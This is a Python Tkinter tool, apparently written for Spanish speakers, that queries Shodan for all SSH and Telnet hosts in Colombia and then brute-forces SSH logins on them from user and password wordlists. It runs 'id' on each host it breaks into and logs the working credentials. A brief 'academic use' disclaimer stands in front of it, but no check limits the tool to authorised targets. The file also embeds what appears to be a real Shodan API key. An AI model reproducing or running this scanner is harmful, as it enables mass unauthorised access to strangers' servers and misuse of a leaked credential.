import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import shodan
import paramiko
import socket
import threading
from queue import Queue
import time

API_KEY = "Fw0T216dIv6gMU81Ft5buP0zTQQSu7GE"  # ← Reemplaza con tu clave real de Shodan

class AuditoriaApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Auditoría SSH/Telnet - LATAM")
        self.root.geometry("850x650")
        
        # Variables de control
        self.scanning = False
        self.stop_event = threading.Event()
        self.task_queue = Queue()
        self.working_threads = 0
        self.max_threads = 10  # Número máximo de hilos concurrentes
        
        self.ip_file = ""
        self.user_file = ""
        self.pass_file = ""
        
        self.pantalla_advertencia()

    def pantalla_advertencia(self):
        """Pantalla inicial de advertencia sobre uso ético"""
        self.clear_window()
        
        frame = tk.Frame(self.root, padx=20, pady=20)
        frame.pack(expand=True, fill=tk.BOTH)
        
        tk.Label(frame, text="⚠️ Uso Académico", font=("Arial", 14, "bold"), fg="red").pack(pady=(0, 20))
        
        msg = "Esta herramienta es solo para fines educativos y pruebas controladas.\n\n" \
              "El uso no autorizado de sistemas informáticos es ilegal.\n" \
              "¿Deseas continuar con la auditoría ética?"
        
        tk.Label(frame, text=msg, wraplength=500, justify=tk.CENTER).pack(pady=10)
        
        btn_frame = tk.Frame(frame)
        btn_frame.pack(pady=20)
        
        tk.Button(btn_frame, text="Acepto", bg="green", fg="white", 
                 command=self.pantalla_principal).pack(side=tk.LEFT, padx=10)
        tk.Button(btn_frame, text="No acepto", bg="red", fg="white", 
                 command=self.root.quit).pack(side=tk.LEFT, padx=10)

    def pantalla_principal(self):
        """Interfaz principal de la aplicación"""
        self.clear_window()
        
        # Frame principal
        main_frame = tk.Frame(self.root, padx=10, pady=10)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        # Frame de controles
        control_frame = tk.Frame(main_frame)
        control_frame.pack(fill=tk.X, pady=5)
        
        # Botones de acción
        tk.Button(control_frame, text="Buscar IPs en Shodan", command=self.buscar_shodan, 
                 bg="orange", width=20).pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="Cargar archivo de IPs", command=self.cargar_ips, 
                 width=20).pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="Cargar archivo de Usuarios", command=self.cargar_usuarios, 
                 width=20).pack(side=tk.LEFT, padx=5)
        tk.Button(control_frame, text="Cargar archivo de Contraseñas", command=self.cargar_passwords, 
                 width=20).pack(side=tk.LEFT, padx=5)
        
        # Frame de auditoría
        audit_frame = tk.Frame(main_frame)
        audit_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(audit_frame, text="Iniciar Auditoría SSH", command=self.iniciar_auditoria, 
                 bg="green", fg="white", width=25).pack(side=tk.LEFT, padx=5)
        tk.Button(audit_frame, text="Detener Auditoría", command=self.detener_auditoria, 
                 bg="red", fg="white", width=25).pack(side=tk.LEFT, padx=5)
        
        # Área de resultados
        result_frame = tk.Frame(main_frame)
        result_frame.pack(fill=tk.BOTH, expand=True)
        
        tk.Label(result_frame, text="Resultados:", font=("Arial", 10, "bold")).pack(anchor=tk.W)
        
        self.resultado_text = scrolledtext.ScrolledText(result_frame, width=100, height=25, wrap=tk.WORD)
        self.resultado_text.pack(fill=tk.BOTH, expand=True)

    def clear_window(self):
        """Limpia todos los widgets de la ventana principal"""
        for widget in self.root.winfo_children():
            widget.destroy()

    def cargar_ips(self):
        """Carga archivo con listado de IPs"""
        self.ip_file = filedialog.askopenfilename(
            title="Seleccionar archivo de IPs",
            filetypes=[("Archivos de texto", "*.txt"), ("Todos los archivos", "*.*")]
        )
        if self.ip_file:
            messagebox.showinfo("Éxito", f"Archivo de IPs cargado:\n{self.ip_file}")

    def cargar_usuarios(self):
        """Carga archivo con listado de usuarios"""
        self.user_file = filedialog.askopenfilename(
            title="Seleccionar archivo de usuarios",
            filetypes=[("Archivos de texto", "*.txt"), ("Todos los archivos", "*.*")]
        )
        if self.user_file:
            messagebox.showinfo("Éxito", f"Archivo de usuarios cargado:\n{self.user_file}")

    def cargar_passwords(self):
        """Carga archivo con listado de contraseñas"""
        self.pass_file = filedialog.askopenfilename(
            title="Seleccionar archivo de contraseñas",
            filetypes=[("Archivos de texto", "*.txt"), ("Todos los archivos", "*.*")]
        )
        if self.pass_file:
            messagebox.showinfo("Éxito", f"Archivo de contraseñas cargado:\n{self.pass_file}")

    def buscar_shodan(self):
        """Busca dispositivos vulnerables usando la API de Shodan"""
        if API_KEY == "TU_API_KEY_DE_SHODAN":
            messagebox.showerror("Error", "Debes reemplazar TU_API_KEY_DE_SHODAN con tu clave real de Shodan")
            return

        self.scanning = True
        self.stop_event.clear()
        self.resultado_text.delete(1.0, tk.END)
        self.resultado_text.insert(tk.END, "[+] Iniciando búsqueda en Shodan...\n")
        self.root.update()

        try:
            api = shodan.Shodan(API_KEY)
            paises_latam = ['CO']

            ssh_ips = []
            telnet_ips = []

            for pais in paises_latam:
                if self.stop_event.is_set():
                    break
                
                try:
                    self.resultado_text.insert(tk.END, f"\n[*] Buscando en {pais}...\n")
                    self.root.update()

                    # Buscar en múltiples puertos SSH comunes
                    puertos_ssh = [22, 2222, 22222, 2200]
                    for puerto in puertos_ssh:
                        try:
                            resultados = api.search(f'port:{puerto} country:{pais}', limit=1000)
                            for servicio in resultados['matches']:
                                ip = servicio['ip_str']
                                if 'ssh' in servicio and servicio['ssh'].get('authentication', True) == False:
                                    # Servidor que permite autenticación sin contraseña
                                    ssh_ips.append(f"{ip}:{puerto}")
                                    self.resultado_text.insert(tk.END, f"[!] SSH SIN AUTENTICACIÓN - {ip}:{puerto}\n")
                                else:
                                    ssh_ips.append(f"{ip}:{puerto}")
                                    self.resultado_text.insert(tk.END, f"[+] SSH - {ip}:{puerto}\n")
                        except Exception as e:
                            self.resultado_text.insert(tk.END, f"[-] Error buscando puerto {puerto} en {pais}: {str(e)}\n")

                    # Buscar Telnet
                    try:
                        telnet_result = api.search(f'port:23 country:{pais}', limit=1000)
                        for servicio in telnet_result['matches']:
                            ip = servicio['ip_str']
                            telnet_ips.append(f"{ip}:23")
                            self.resultado_text.insert(tk.END, f"[+] Telnet - {ip}:23\n")
                    except Exception as e:
                        self.resultado_text.insert(tk.END, f"[-] Error buscando Telnet en {pais}: {str(e)}\n")

                except Exception as e:
                    self.resultado_text.insert(tk.END, f"[-] Error general en {pais}: {str(e)}\n")

                self.resultado_text.see(tk.END)
                self.root.update()

            # Guardar resultados
            with open("ips_ssh.txt", "w") as f:
                f.write("\n".join(ssh_ips))
            with open("ips_telnet.txt", "w") as f:
                f.write("\n".join(telnet_ips))

            self.resultado_text.insert(tk.END, f"\n[✔] Búsqueda terminada. SSH: {len(ssh_ips)}, Telnet: {len(telnet_ips)}\n")
            messagebox.showinfo("Éxito", "Búsqueda en Shodan completada")

        except Exception as e:
            self.resultado_text.insert(tk.END, f"[-] Error grave en Shodan: {str(e)}\n")
            messagebox.showerror("Error", f"Error en Shodan: {str(e)}")
        finally:
            self.scanning = False

    def verificar_puerto_abierto(self, ip, puerto, timeout=3):
        """Verifica si un puerto está abierto antes de intentar conexión"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(timeout)
                return s.connect_ex((ip, puerto)) == 0
        except:
            return False

    def worker(self):
        """Hilo de trabajo para probar credenciales"""
        while not self.task_queue.empty() and not self.stop_event.is_set():
            try:
                ip_port, user, pwd = self.task_queue.get_nowait()
            except:
                break
                
            ip, port = ip_port.split(":")
            port = int(port)
            
            if not self.verificar_puerto_abierto(ip, port):
                self.resultado_text.insert(tk.END, f"[-] Puerto cerrado: {ip}:{port}\n")
                self.task_queue.task_done()
                continue
                
            self.probar_credenciales(ip, port, user, pwd)
            self.task_queue.task_done()
            
        self.working_threads -= 1

    def probar_credenciales(self, ip, port, user, pwd):
        """Intenta autenticarse con las credenciales proporcionadas"""
        mensaje = f"Probando {user}:{pwd} en {ip}:{port}...\n"
        self.resultado_text.insert(tk.END, mensaje)
        self.resultado_text.see(tk.END)
        self.root.update()

        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        try:
            ssh.connect(ip, port=port, username=user, password=pwd, timeout=10, banner_timeout=10, auth_timeout=10)
            
            # Ejecutar un comando simple para verificar acceso real
            stdin, stdout, stderr = ssh.exec_command('id', timeout=5)
            output = stdout.read().decode().strip()
            
            mensaje = f"[✔] ACCESO EXITOSO - {ip}:{port} - {user}:{pwd}\n"
            mensaje += f"    Resultado de 'id': {output}\n\n"
            
            self.resultado_text.insert(tk.END, mensaje)
            with open("vulnerabilidades_detectadas.txt", "a") as f:
                f.write(mensaje)
                
            ssh.close()
            return True
            
        except paramiko.ssh_exception.AuthenticationException:
            return False
        except paramiko.ssh_exception.SSHException as e:
            error_msg = f"[-] Error SSH en {ip}:{port}: {str(e)}\n"
            self.resultado_text.insert(tk.END, error_msg)
            with open("errores_conexion.txt", "a") as f:
                f.write(error_msg)
            return False
        except socket.timeout:
            error_msg = f"[-] Timeout en {ip}:{port}\n"
            self.resultado_text.insert(tk.END, error_msg)
            with open("errores_conexion.txt", "a") as f:
                f.write(error_msg)
            return False
        except Exception as e:
            error_msg = f"[-] Error inesperado en {ip}:{port}: {str(e)}\n"
            self.resultado_text.insert(tk.END, error_msg)
            with open("errores_conexion.txt", "a") as f:
                f.write(error_msg)
            return False

    def iniciar_auditoria(self):
        """Inicia el proceso de auditoría con los archivos cargados"""
        if not self.ip_file or not self.user_file or not self.pass_file:
            messagebox.showerror("Error", "Debes cargar los tres archivos (IPs, usuarios y contraseñas)")
            return

        if self.scanning:
            messagebox.showwarning("Advertencia", "Ya hay una auditoría en progreso")
            return

        self.scanning = True
        self.stop_event.clear()
        
        # Limpiar archivos de resultados
        open("vulnerabilidades_detectadas.txt", "w").close()
        open("errores_conexion.txt", "w").close()

        self.resultado_text.delete(1.0, tk.END)
        self.resultado_text.insert(tk.END, "[*] Iniciando auditoría SSH...\n")
        self.resultado_text.see(tk.END)
        self.root.update()

        try:
            with open(self.ip_file) as f:
                ip_lines = [line.strip() for line in f if line.strip()]
            with open(self.user_file) as f:
                users = [line.strip() for line in f if line.strip()]
            with open(self.pass_file) as f:
                passwords = [line.strip() for line in f if line.strip()]
        except Exception as e:
            self.resultado_text.insert(tk.END, f"[-] Error cargando archivos: {e}\n")
            self.scanning = False
            return

        # Llenar la cola de tareas
        for ip_port in ip_lines:
            if ':' not in ip_port:
                continue
                
            for user in users:
                for pwd in passwords:
                    if self.stop_event.is_set():
                        break
                    self.task_queue.put((ip_port, user, pwd))

        # Iniciar hilos de trabajo
        self.working_threads = min(self.max_threads, self.task_queue.qsize())
        for _ in range(self.working_threads):
            if self.stop_event.is_set():
                break
            threading.Thread(target=self.worker, daemon=True).start()

        # Monitorear progreso
        self.monitorear_progreso()

    def monitorear_progreso(self):
        """Monitorea el progreso de la auditoría"""
        if self.task_queue.empty() and self.working_threads == 0:
            self.scanning = False
            self.resultado_text.insert(tk.END, "\n[✔] Auditoría SSH finalizada.\n")
            messagebox.showinfo("Éxito", "Auditoría completada")
            return
            
        self.root.after(1000, self.monitorear_progreso)

    def detener_auditoria(self):
        """Detiene la auditoría en curso"""
        if self.scanning:
            self.stop_event.set()
            self.scanning = False
            self.resultado_text.insert(tk.END, "\n[!] Auditoría detenida por el usuario\n")
            messagebox.showinfo("Información", "Auditoría detenida")

if __name__ == "__main__":
    root = tk.Tk()
    app = AuditoriaApp(root)
    root.mainloop()
